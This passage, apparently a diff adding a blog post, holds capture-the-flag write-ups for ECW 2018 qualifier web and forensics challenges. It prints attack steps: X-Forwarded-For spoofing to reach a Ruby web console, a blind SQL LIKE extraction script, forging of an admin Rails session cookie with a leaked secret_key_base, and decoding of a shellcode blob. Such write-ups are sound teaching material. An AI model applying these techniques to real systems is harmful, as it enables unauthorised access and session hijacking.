+$ bash ./exploit-cd.sh https://web125-trolljsp.challenge-ecw.fr/.flag.jsp.swp 'cat ./opt/tomcat/webapps/ECW/flag.jsp'
+[...]
+              &lt;/a&gt;
+            &lt;/li&gt;
+          &lt;/ul&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/nav&gt;&lt;s:set var='flag' value='%{&quot;ECW{babde20f76698360d6f1a500b821e797}&quot;}'/&gt;&lt;s:set var='trollFlag' value='%{&quot;ECW{a9ec6fc4217038a6f91294b8e5ed9933}&quot;}'/&gt;&lt;s:set var='result' value='%{#session.flag!=null?#flag:#trollFlag}'/&gt;
+    &lt;div class=&quot;container&quot;&gt;
+      &lt;div class=&quot;row&quot;&gt;
+        &lt;div class=&quot;col-lg-12 text-center&quot;&gt;
+			&lt;p class=&quot;lead&quot;&gt;Now that's a flag! &lt;s:property value = &quot;result&quot;/&gt;&lt;/p&gt;
+[...]
+</code></pre>
+
+<h2 id="flag-2">Flag</h2>
+
+<blockquote>
+<p>ECW{babde20f76698360d6f1a500b821e797}</p>
+</blockquote>
+
+<hr />
+
+<h1 id="intrusion-1-4">Intrusion <sup>1</sup>&frasl;<sub>4</sub></h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>ECW Quals</td>
+<td>Web</td>
+<td>Web</td>
+<td>??</td>
+<td>??</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="state-of-the-art-3">State of the art</h2>
+
+<p>I start this challenge with a website:</p>
+
+<blockquote>
+<p>web150-smartstuff.challenge-ecw.fr</p>
+</blockquote>
+
+<p>Nothing really interesting at first glance. After digging a bit in HTML source code, I notice 2 pages:</p>
+
+<ul>
+<li>thor.css</li>
+<li>thor.js</li>
+</ul>
+
+<h2 id="thor-css">Thor.css</h2>
+
+<p>When I checked this file, I noticed a different subdomain:</p>
+
+<blockquote>
+<p>web150_dev.challenge-ecw.fr</p>
+</blockquote>
+
+<h2 id="flag-3">Flag</h2>
+
+<p>Then I just curl this new subdomain:</p>
+
+<pre><code class="language-bash">$ curl -v -H 'User-Agent: Chrome' https://web150_dev.challenge-ecw.fr
+[...]
+ECW{5822a94206522fe5382d2f00acc5cadf}
+[...]
+</code></pre>
+
+<hr />
+
+<h1 id="intrusion-2-4">Intrusion <sup>2</sup>&frasl;<sub>4</sub></h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>ECW Quals</td>
+<td>Intrusion <sup>2</sup>&frasl;<sub>4</sub></td>
+<td>Web</td>
+<td>??</td>
+<td>??</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="state-of-the-art-4">State of the art</h2>
+
+<p>Ok, now we&rsquo;re on the dev platform. After a lot of fuzzing, I finally find a bug. When I&rsquo;m sending <code>OPTIONS</code> HTTP request, I get a weird output:</p>
+
+<pre><code class="language-bash">$ curl -v -X OPTIONS -H 'User-Agent: Chrome' https://web150_dev.challenge-ecw.fr
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/intru1.png" alt="" />
+<em>Fig1</em>: Output in browser
+</center></p>
+
+<h2 id="x-forwarded-for-spoofing">X-Forwarded-For spoofing</h2>
+
+<p>In the previous Figure, we notice something interesting:</p>
+
+<blockquote>
+<p>HTTP_F_FORWARDED_FOR: &ldquo;176.187.238.100, 10.1.0.10, 127.0.0.1&rdquo;</p>
+</blockquote>
+
+<p>In a previous CTF and in real-world pentests, I already came across this kind of WAF. It only allows connections from precise IP addresses, such as <code>127.0.0.1</code>.</p>
+
+<pre><code class="language-bash">$ curl -X OPTIONS -H 'X-Forwarded-For: 127.0.0.1' -H 'User-Agent: Chrome' https://web150_dev.challenge-ecw.fr/
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/intru2.png" alt="" />
+<em>Fig2</em>: Web console
+</center></p>
+
+<p>It&rsquo;s a Ruby webconsole. I used those lines to display the content of the directories and the files:</p>
+
+<pre><code class="language-ruby">Dir['*']
+File.open('file').readlines()
+</code></pre>
+
+<h2 id="flag-4">Flag</h2>
+
+<p>After looking over some files, I finally open <code>config/initializers/web_console.rb</code>:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/intru3.png" alt="" />
+<em>Fig3</em>: Flag, don&rsquo;t you see it?
+</center></p>
+
+<p>Unhex string gives us:</p>
+
+<blockquote>
+<p>ECW{5948462211d00c9cec468fd194e76c5f}</p>
+</blockquote>
+
+<hr />
+
+<h1 id="intrusion-hint">Intrusion hint</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>ECW Quals</td>
+<td>Intrusion hint</td>
+<td>Web</td>
+<td>??</td>
+<td>??</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="state-of-the-art-5">State of the art</h2>
+
+<p>This time, it&rsquo;s not on the dev platform, it&rsquo;s on a new website:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/intru4.png" alt="" />
+<em>Fig1</em>: Website
+</center></p>
+
+<p>Maybe something with <code>LIKE</code> in SQL:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/intru5.png" alt="" />
+<em>Fig2</em>: Amount of hint
+</center></p>
+
+<p>5 hints found in the database. Let&rsquo;s extract them :)</p>
+
+<h2 id="data-extraction">Data extraction</h2>
+
+<p>I guess one of them is the flag. The payload looks like:</p>
+
+<blockquote>
+<p>[char]*</p>
+</blockquote>
+
+<p>So I did this little script (do you remember my ugly script in <code>AdmYSsion</code>?):</p>
+
+<pre><code class="language-python">import requests
+import string
+
+partial = ''
+no_pass = True
+charset = string.hexdigits+'}'
+
+url = 'https://web150-hint.challenge-ecw.fr/search'
+
+nogo = '1 hint found'
+
+while no_pass:
+    no_pass = False
+    for i in charset:
+        payload = 'ECW'+str(partial+i)+'%'
+        r = requests.post(url, data = {'request': payload})
+        if nogo in r.text:
+            no_pass = True
+            partial += i
+            print('Found: '+partial)
+            break
+    print(partial)
+</code></pre>
+
+<h2 id="hints">Hints</h2>
+
+<p>I edit the script to extract all the hints:</p>
+
+<blockquote>
+<p><a href="https://gist.github.com/mbyczkowski/34fb691b4d7a100c32148705f244d028">https://gist.github.com/mbyczkowski/34fb691b4d7a100c32148705f244d028</a></p>
+
+<p><a href="http://manpages.ubuntu.com/manpages/cosmic/en/man1/systemctl.1.html">http://manpages.ubuntu.com/manpages/cosmic/en/man1/systemctl.1.html</a></p>
+
+<p>/home/web200/smart_stuff/config/initializers/web_console.rb</p>
+
+<p>/home/web200/smart_stuff/config/secrets.yml</p>
+</blockquote>
+
+<h2 id="flag-5">Flag</h2>
+
+<p>Then the flag:</p>
+
+<blockquote>
+<p>ECW{ebbbb414c38020906fd34bdd49ceea36}</p>
+</blockquote>
+
+<hr />
+
+<h1 id="intrusion-3-4">Intrusion <sup>3</sup>&frasl;<sub>4</sub></h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>ECW Quals</td>
+<td>Intrusion hint</td>
+<td>Web</td>
+<td>??</td>
+<td>??</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="state-of-the-art-6">State of the art</h2>
+
+<p>Go back to the dev platform, the real challenge is starting. One of the previous hints mentioned <code>secrets.yml</code>:</p>
+
+<pre><code class="language-yml"># Be sure to restart your server when you modify this file.
+
+# Your secret key is used for verifying the integrity of signed cookies.
+# If you change this key, all old signed cookies will become invalid!
+
+# Make sure the secret is at least 30 characters and all random,
+# no regular words or you'll be exposed to dictionary attacks.
+# You can use `rails secret` to generate a secure secret key.
+
+# Make sure the secrets in this file are kept private
+# if you're sharing your code publicly.
+
+# Shared secrets are available across all environments.
+
+# shared:
+#   api_key: a1B2c3D4e5F6
+
+# Environmental secrets are only available for that specific environment.
+
+development:
+  secret_key_base: 08c89a3c48235a3e7211c1b7d3a239687929455cf8b6e3bc1c37ad5b4e937f0e9a5d0f3e62731375f099b692ae17e0852ee047d65ced240b7a38910e2ed06e59
+
+test:
+  secret_key_base: 1cd775a1587363d69a47ce39af7e7ff13ea1b2f10dbc3a92bed16ac05436c2493be22280deee4fde699a88208b2de3738ae1257208002b2b1f32029bb096717e
+
+# Do not keep production secrets in the unencrypted secrets file.
+# Instead, either read values from the environment.
+# Or, use `bin/rails secrets:setup` to configure encrypted secrets
+# and move the `production:` environment over there.
+
+production:
+  secret_key_base: &lt;%= ENV[\&quot;SECRET_KEY_BASE\&quot;] %&gt;
+</code></pre>
+
+<p>In another previous hint, the GitHub repository gave us a script able to decrypt Ruby on Rails cookies:</p>
+
+<pre><code class="language-Ruby">require 'cgi'
+require 'json'
+require 'active_support'
+
+def verify_and_decrypt_session_cookie(cookie, secret_key_base)
+  cookie = CGI::unescape(cookie)
+  salt         = 'encrypted cookie'
+  signed_salt  = 'signed encrypted cookie'
+  key_generator = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000)
+  secret = key_generator.generate_key(salt)[0, ActiveSupport::MessageEncryptor.key_len]
+  sign_secret = key_generator.generate_key(signed_salt)
+  encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: JSON)
+  encryptor.decrypt_and_verify(cookie)
+end
+</code></pre>
+
+<p>Then to decrypt my cookie I need:</p>
+
+<ul>
+<li>My Cookie (of course)</li>
+<li>salt</li>
+<li>signed_salt</li>
+<li>secret_key_base of the dev platform</li>
+</ul>
+
+<h2 id="decrypting-the-cookie">Decrypting the cookie</h2>
+
+<p>To obtain <code>salt</code> and <code>signed_salt</code>, I have to display <code>./config/application.rb</code>:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/intru6.png" alt="" />
+<em>Fig1</em>: salt and signed_salt
+</center></p>
+
+<ul>
+<li>salt: ECW-secret-salt</li>
+<li>signed-salt: ECW-signature-secret-salt</li>
+</ul>
+
+<p><strong>/!\ config.action_dispatch.cookies_serializer = :marshal</strong> in <code>application.rb</code> !!!  It&rsquo;s not JSON formatted, it&rsquo;s Marshal formatted, and Marshal from Python and Ruby are different&hellip;</p>
+
+<p>I got the <code>secret_key_base</code> in <code>secrets.yml</code> file:</p>
+
+<pre><code>08c89a3c48235a3e7211c1b7d3a239687929455cf8b6e3bc1c37ad5b4e937f0e9a5d0f3e62731375f099b692ae17e0852ee047d65ced240b7a38910e2ed06e59
+</code></pre>
+
+<p>And the <code>cookie</code>:</p>
+
+<pre><code>NC9XWkNHT0lKMytId0E2cjdBQ1dKSnVSZ1MyeTV4elRsK0VHK1hrR1drSmJ4eEEzakU2TDhoTGZPWk9tZXZCZDhUemhHckF3NXU4bXIvdTZKWHQwQ3c1UXRVNkJoNm9ueFROYkYwZGdCZFhjSmNvR09LTityYi94dkJDVXZwNXpXNGFLZGNNSmJmdThtRE1iZGtwbmVWSFhOQ1ZBSUE3bGdWM3grUWhSb1hQWjdCd3NrbHJXaE40WXN5ekw3NHpmZlpzdlN1eTZoYmhhK01pSlNVV1dhWG4vM3J1a1VHcDh2TVI0VHVYbEY1NG1sSHBUUFNBRUJlaDdIdGVxcHd2Vk5kelVkMVJrZFZnd24zOWZQdXVJbjF2Tk8rUjRVSTUza0h5djNGWWVxd2dRdGVhMS9XMXZ4KytuZDFxeVc1V25GMW9CbmtQNUF0cEJGcTJ6MUtqc2ZsOE9icE5MZlU5cTFaeS9QSlN0ZjdNTkw4ZFNnOUhRWjdoTVdpbmFUdnBOZXV2djJOVm9nOWpiNEJnQ0ljLzJ5dHBjZGdPb3pyU1hzOUY0SUFtMVF4Y3VYODFvb04wemozV2puRUVTMnBUM2RDcjBnQ1N1R253aW1iVTlPNFYwQ1dxUTdRTUVVaGRnc3BWMXNiZ3VWWE5ReEJabmRaZ2xWY3FWTEZBL1dJYjF6all4bXcrNGg5cWx6aXNwVzBqVlVIQ1N0ajYzOHBPcU1BRmhwOGR6c2xQbUxNakFuVXdCcDd2VElnZHpEdDdyRHhYQVA1cm04TWo1VUdGVXNuQVVkUUt5VEVNUHQwOEhOL1JYcXpuaWhiVzNpN2hVemxqU2l3b2xUK1crazhEN2xKZFNnWTg3NU9lSms5UFdHM2JDQU0xQnRacWp1bTBVN21TVDRWME1BWEtwM3BvamdiMnJBYjEyRlkxUWJuWjdYc0ROUU12bGRxQ0VYNjhzZkpZbDBTWTVhdjdMWENSZW9HRXBZWHgzbDVoQjFtMHR2cHJrZnhidWRUNzlualIzZFl2aWliUVcrQ1RFNzBLY3hqV2lsZTVxZnpYOXMzREtJRUJQamJOZDlqZ1p3blkxemtsblB5S0pPNmF6dkVZSjFLNGE3Q2dqMHVJdkdUWC96d1Vzc2l2QXBIZkREdzRHU2FpWVp1S3VnR216ajJCdE9qU3NYbHlyZmZkdWlYUFVRSFZIbU9WUzA4RXBBQlRyYmhIR0ZnUFE4cEdZaitSMlBPYnBUN2s5c2MzekVGOG9Ua2dKMngweDkxRTRXM3lTWkIxVW4yWHNLUXZYd3FPZWtIS3M2ZlN0bjJIQUw0Y1ZJZXNpN3lSeGVpYXNLcGxPVjZ6WnFqaWNLMVowYmVPTy93aUQrV2VlWWI4MGIvcVYxeThuMmJkWjVnQVMrOEFtRW9NNGVzNm0vNFlFbE4zWTZVSTh6VmYyRUtsb3N5b3MxZnB0UysrMWJWWGM1ckpORjlPMW9KOGNjQzBCbnA0TEN4WUdhd00xdWNkbTAwNG4zYmJNRGJlRm1ScEhKRS9OSEd6NDE5R0dKOERmZHdRcmVyNFlwbGowdnVTQjFxSFVhL2ZuZG52dFNsM3FEU3AvMFZzaTVQbXE0bkJXNmpVUXV1YzlCL0NvcFlBUjhzVU44V3I5Lzh1YlhuUWFFS3VVcU52Z20xMmY1OU5mS1hqQ0xGMVd2NGs5RG5PaU9OcGp2YmUwMkFzeWpYdExDaGRrSHo3RTQyeTkwTzE0bkhldXlxQ0hCRmJlbmlPN3UzeXFzUkNwZGNzVmcwNllLRzZnSUtMT0pZN3NHRHp2S2ZmNjNMRTRqdDhQS3hTRG1NYVlkRHEzenBIdHBkbURnYmRYTDUzOHNEcWxQcmN2VmpkQi0tamVLWVpBZHFVcUdkd2EzWnJPNUFaQT09--9d215e2f0ade6d2657279fca4b2516d0c07b97da
+</code></pre>
+
+<p>I believed naively that I could use the decryption script on my laptop without any troubles&hellip; After a few hours of me going crazy, I had an illumination. I want to run a ruby script, I have a web console in ruby, YES!</p>
+
+<p>Here is my beautiful decryption script with all the variables put together:</p>
+
+<pre><code class="language-ruby">cookie = NC9XWkNHT0lKMytId0E2cjdBQ1dKSnVSZ1MyeTV4elRsK0VHK1hrR1drSmJ4eEEzakU2TDhoTGZPWk9tZXZCZDhUemhHckF3NXU4bXIvdTZKWHQwQ3c1UXRVNkJoNm9ueFROYkYwZGdCZFhjSmNvR09LTityYi94dkJDVXZwNXpXNGFLZGNNSmJmdThtRE1iZGtwbmVWSFhOQ1ZBSUE3bGdWM3grUWhSb1hQWjdCd3NrbHJXaE40WXN5ekw3NHpmZlpzdlN1eTZoYmhhK01pSlNVV1dhWG4vM3J1a1VHcDh2TVI0VHVYbEY1NG1sSHBUUFNBRUJlaDdIdGVxcHd2Vk5kelVkMVJrZFZnd24zOWZQdXVJbjF2Tk8rUjRVSTUza0h5djNGWWVxd2dRdGVhMS9XMXZ4KytuZDFxeVc1V25GMW9CbmtQNUF0cEJGcTJ6MUtqc2ZsOE9icE5MZlU5cTFaeS9QSlN0ZjdNTkw4ZFNnOUhRWjdoTVdpbmFUdnBOZXV2djJOVm9nOWpiNEJnQ0ljLzJ5dHBjZGdPb3pyU1hzOUY0SUFtMVF4Y3VYODFvb04wemozV2puRUVTMnBUM2RDcjBnQ1N1R253aW1iVTlPNFYwQ1dxUTdRTUVVaGRnc3BWMXNiZ3VWWE5ReEJabmRaZ2xWY3FWTEZBL1dJYjF6all4bXcrNGg5cWx6aXNwVzBqVlVIQ1N0ajYzOHBPcU1BRmhwOGR6c2xQbUxNakFuVXdCcDd2VElnZHpEdDdyRHhYQVA1cm04TWo1VUdGVXNuQVVkUUt5VEVNUHQwOEhOL1JYcXpuaWhiVzNpN2hVemxqU2l3b2xUK1crazhEN2xKZFNnWTg3NU9lSms5UFdHM2JDQU0xQnRacWp1bTBVN21TVDRWME1BWEtwM3BvamdiMnJBYjEyRlkxUWJuWjdYc0ROUU12bGRxQ0VYNjhzZkpZbDBTWTVhdjdMWENSZW9HRXBZWHgzbDVoQjFtMHR2cHJrZnhidWRUNzlualIzZFl2aWliUVcrQ1RFNzBLY3hqV2lsZTVxZnpYOXMzREtJRUJQamJOZDlqZ1p3blkxemtsblB5S0pPNmF6dkVZSjFLNGE3Q2dqMHVJdkdUWC96d1Vzc2l2QXBIZkREdzRHU2FpWVp1S3VnR216ajJCdE9qU3NYbHlyZmZkdWlYUFVRSFZIbU9WUzA4RXBBQlRyYmhIR0ZnUFE4cEdZaitSMlBPYnBUN2s5c2MzekVGOG9Ua2dKMngweDkxRTRXM3lTWkIxVW4yWHNLUXZYd3FPZWtIS3M2ZlN0bjJIQUw0Y1ZJZXNpN3lSeGVpYXNLcGxPVjZ6WnFqaWNLMVowYmVPTy93aUQrV2VlWWI4MGIvcVYxeThuMmJkWjVnQVMrOEFtRW9NNGVzNm0vNFlFbE4zWTZVSTh6VmYyRUtsb3N5b3MxZnB0UysrMWJWWGM1ckpORjlPMW9KOGNjQzBCbnA0TEN4WUdhd00xdWNkbTAwNG4zYmJNRGJlRm1ScEhKRS9OSEd6NDE5R0dKOERmZHdRcmVyNFlwbGowdnVTQjFxSFVhL2ZuZG52dFNsM3FEU3AvMFZzaTVQbXE0bkJXNmpVUXV1YzlCL0NvcFlBUjhzVU44V3I5Lzh1YlhuUWFFS3VVcU52Z20xMmY1OU5mS1hqQ0xGMVd2NGs5RG5PaU9OcGp2YmUwMkFzeWpYdExDaGRrSHo3RTQyeTkwTzE0bkhldXlxQ0hCRmJlbmlPN3UzeXFzUkNwZGNzVmcwNllLRzZnSUtMT0pZN3NHRHp2S2ZmNjNMRTRqdDhQS3hTRG1NYVlkRHEzenBIdHBkbURnYmRYTDUzOHNEcWxQcmN2VmpkQi0tamVLWVpBZHFVcUdkd2EzWnJPNUFaQT09--9d215e2f0ade6d2657279fca4b2516d0c07b97da
+
+secret_key_base = 08c89a3c48235a3e7211c1b7d3a239687929455cf8b6e3bc1c37ad5b4e937f0e9a5d0f3e62731375f099b692ae17e0852ee047d65ced240b7a38910e2ed06e59
+
+salt = ECW-secret-salt
+signed_salt = ECW-signature-secret-salt
+
+key_generator = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000)
+secret = key_generator.generate_key(salt)[0, ActiveSupport::MessageEncryptor.key_len]
+sign_secret = key_generator.generate_key(signed_salt)
+encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: Marshal)
+encryptor.decrypt_and_verify(cookie)
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/intru7.png" alt="" />
+<em>Fig2</em>: Decrypted cookie
+</center></p>
+
+<pre><code>{&quot;session_id&quot;=&gt;&quot;BLAH&quot;, &quot;user&quot;=&gt;#&lt;User id: nil, name: nil, password: nil, salt: nil, admin: nil, created_at: nil, updated_at: nil&gt;}
+</code></pre>
+
+<h2 id="cookie-crafting">Cookie crafting</h2>
+
+<p>I don&rsquo;t have any screenshots of this part or any logs&hellip; But to craft a new admin cookie, you just have to set those fields:</p>
+
+<ul>
+<li>id: Any number</li>
+<li>name: Any name</li>
+<li>admin: true</li>
+</ul>
+
+<p>In Ruby, it works like a dictionnary in Python:</p>
+
+<pre><code class="language-ruby">&gt;&gt; a = {&quot;session_id&quot;=&gt;&quot;BLAH&quot;, &quot;user&quot;=&gt;#&lt;User id: nil, name: nil, password: nil, salt: nil, admin: nil, created_at: nil, updated_at: nil&gt;}
+&gt;&gt; a['user']['name'] = admin
+=&gt; &quot;admin&quot;
+&gt;&gt; a['user']['id'] = 1
+=&gt; 1
+&gt;&gt; a['user']['admin'] = true
+=&gt; true
+</code></pre>
+
+<p>The encryption key and salt are already in memory, just use this function:</p>
+
+<pre><code class="language-ruby">b = encryptor.encrypt_and_sign(a)
+[Big cookie]
+</code></pre>
+
+<h2 id="connect-as-admin">Connect as admin</h2>
+
+<p>Just open <code>Local storage</code> in your <code>Web developers tools</code> and overwrite your existing cookie, and&hellip; W00t! We&rsquo;re the admin of the dev platform!&hellip;</p>
+
+<p>BUT IT&rsquo;S USELESS!!!</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/26ufcVAp3AiJJsrIs/giphy.gif" alt="" />
+</center></p>
+
+<h2 id="flag-6">Flag</h2>
+
+<p>Go back to the hints and look at the one mentionning <code>systemd</code>. After a few minutes of digging, I got this:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/intru9.png" alt="" />
+<em>Fig3</em>: Systemd file
+</center></p>
+
+<blockquote>
+<p>ECW{172ce5c14098e888a09053c0518bda08}</p>
+</blockquote>
+
+<hr />
+
+<h1 id="intrusion-4-4">Intrusion <sup>4</sup>&frasl;<sub>4</sub></h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>ECW Quals</td>
+<td>Intrusion <sup>4</sup>&frasl;<sub>4</sub></td>
+<td>Web</td>
+<td>??</td>
+<td>??</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="state-of-the-art-7">State of the art</h2>
+
+<p>Well, now we have to get the admin access on the production platform. I have the <code>secret_key_base</code> key:</p>
+
+<ul>
+<li>secret_key_base of prod: A_cookie_of_course</li>
+</ul>
+
+<h2 id="crafting-admin-cookie">Crafting admin cookie</h2>
+
+<p>In the previous challenge, when I said it was &ldquo;useless&rdquo; to be the admin of the dev platform, it wasn&rsquo;t true. It taught me how to decrypt and craft cookies. Now I just have to take the prod cookie, decrypt it and I get the <code>session_id</code>.</p>
+
+<pre><code>{&quot;session_id&quot;=&gt;&quot;PROD SESSION ID&quot;, &quot;user&quot;=&gt;#&lt;User id: nil, name: nil, password: nil, salt: nil, admin: nil, created_at: nil, updated_at: nil&gt;}
+</code></pre>
+
+<p>I fill the fields with the appropriate data and <code>encrypt_and_sign</code> the cookie with the new <code>secret_key_base</code>.</p>
+
+<h2 id="flag-7">Flag</h2>
+
+<p>I just overwrite my old cookie with my fresh one, and finally go on the <code>/admin/</code> page on prod:</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/12NUbkX6p4xOO4/giphy.gif" alt="" />
+</center></p>
+
+<blockquote>
+<p>ECW{2c9ff616d19419cc9ca91f5b0829e802}</p>
+</blockquote>
+
+<hr />
+
+<h1 id="drone-wars-1">Drone Wars 1</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>ECW Quals</td>
+<td>Drone Wars 1</td>
+<td>&ldquo;Forensic&rdquo;</td>
+<td>??</td>
+<td>??</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="state-of-the-art-8">State of the art</h2>
+
+<p>We have 2 files: <code>Capture.zip</code> and <code>capture.wav</code>. There is a binary file in the zip archive, don&rsquo;t worry about it for now.</p>
+
+<p>After several hours of crawling the internet searching for datas about the .wav files, I found a stego technic: SSTV.</p>
+
+<blockquote>
+<p><a href="https://medium.com/@sumit.arora/audio-steganography-the-art-of-hiding-secrets-within-earshot-part-2-of-2-c76b1be719b3">https://medium.com/@sumit.arora/audio-steganography-the-art-of-hiding-secrets-within-earshot-part-2-of-2-c76b1be719b3</a></p>
+</blockquote>
+
+<p>I found a tool for linux: <code>qsstv</code>.</p>
+
+<h2 id="decoding-the-wav">Decoding the .wav</h2>
+
+<p>I run <code>QSSTV</code> with <code>VLC</code> in background, set my audio output into QSSTV, and:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/drone1.png" alt="" />
+<em>Fig1</em>: Decoded picture
+</center></p>
+
+<h2 id="flag-8">Flag</h2>
+
+<blockquote>
+<p>ECW{da553166e44a3151dfe422c34f693fe6}</p>
+</blockquote>
+
+<hr />
+
+<h1 id="drone-wars-hint-1">Drone Wars Hint 1</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>ECW Quals</td>
+<td>DW Hint1</td>
+<td>&ldquo;Forensic&rdquo;</td>
+<td>??</td>
+<td>??</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<p>Like the first Drone Wars challenge, we have a horrible <code>.wav</code> file. Let&rsquo;s try with QSSTV:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/drone2.png" alt="" />
+<em>Fig1</em>: Decoded picture
+</center></p>
+
+<p>Same thing :)</p>
+
+<h2 id="flag-9">Flag</h2>
+
+<blockquote>
+<p>ECW{SHELLCODES}</p>
+</blockquote>
+
+<hr />
+
+<h1 id="drone-wars-2">Drone wars 2</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>ECW Quals</td>
+<td>DW 2</td>
+<td>&ldquo;Forensic&rdquo;</td>
+<td>??</td>
+<td>??</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<p>In the first challenge, we got a QR code. It contained the following data:</p>
+
+<blockquote>
+<p>6xVeMcAx2zHJs0WwKjEEDkE5y3X4/+bo5v///xvqG/Eb4xv4mi6ZK8Emc5gAPueqG+pqG/HnqsLF1dXVbwBpfVFLHhtPT05LGxNOThlJABlMThJITxIbGEgdEkxMHBsASE9IVyA=</p>
+</blockquote>
+
+<p>Decoded:</p>
+
+<blockquote>
+<p>\xeb\x15^1\xc01\xdb1\xc9\xb3E\xb0*1\x04\x0eA9\xcbu\xf8\xff\xe6\xe8\xe6\xff\xff\xff\x1b\xea\x1b\xf1\x1b\xe3\x1b\xf8\x9a.\x99+\xc1&amp;s\x98\x00&gt;\xe7\xaa\x1b\xeaj\x1b\xf1\xe7\xaa\xc2\xc5\xd5\xd5\xd5o\x00i}QK\x1e\x1bOONK\x1b\x13NN\x19I\x00\x19LN\x12HO\x12\x1b\x18H\x1d\x12LL\x1c\x1b\x00HOHW</p>
+</blockquote>
+
+<p>Wow, cool, bullshit. Let&rsquo;s try with le old bruteforce technique. Rotation? Nope. XOR ? Yes! It was a one byte key.</p>
+
+<pre><code class="language-python">#!/usr/bin/python2
+
+import base64
+
+msg = base64.b64decode('6xVeMcAx2zHJs0WwKjEEDkE5y3X4/+bo5v///xvqG/Eb4xv4mi6ZK8Emc5gAPueqG+pqG/HnqsLF1dXVbwBpfVFLHhtPT05LGxNOThlJABlMThJITxIbGEgdEkxMHBsASE9IVyA=')
+key = chr(42)
+s = &quot;&quot;
+
+for j in range(256):
+    j = chr(j)
+    for i in range(len(msg)):
+        s += chr(ord(msg[i])^ord(j[i%len(j)]))
+        if 'W{' in s:
+            print(s)
+    s = &quot;&quot;
+</code></pre>
+
+<blockquote>
+<p>�?to��_��������1�1�1�1Ұ��
+                         Y�*̀1�@1�̀�����E*CW{a41eeda19dd3c*3fd8be812b78ff61*beb}</p>
+</blockquote>
+
+<h2 id="flag-10">Flag</h2>
+
+<blockquote>
+<p>ECW{a41eeda19dd3c3fd8be812b78ff61beb}</p>
+</blockquote>
+
+<hr />
+
+<h1 id="drone-wars-hint-2">Drone wars hint 2</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>ECW Quals</td>
+<td>DW Hint 2</td>
+<td>&ldquo;Forensic&rdquo;</td>
+<td>??</td>
+<td>??</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="state-of-the-art-9">State of the art</h2>
+
+<p>We have a JPG picture, a lot of steg stuff can be effective.</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/dwhint2.jpg" alt="" />
+<em>Fig1</em>: Original picture
+</center></p>
+
+<h2 id="guessing-of-the-year">Guessing of the year</h2>
+
+<p>I went with the <code>steghide</code> tool&hellip; And the steghide passphrase: <code>ECW</code>.</p>
+
+<pre><code class="language-bash">$ steghide extract -sf DSC20181007160312834378.jpg
+Entrez la passphrase: (ECW)
+�criture des donn�es extraites dans &quot;secret.txt&quot;.
+
+$ cat secret.txt 
+..-. .. .-.. . / ... --- ..- .-. -.-. . / -....- # / --. ..-. ... -.- / -.. . -- --- -.. / -....- # / .--. .- -.-. -.- . - / -.. . -.-. --- -.. . .-. / -....- # / ..-. .. .-.. . / ... .. -. -.-
+</code></pre>
+
+<h2 id="morse-to-binary">Morse to binary</h2>
+
+<blockquote>
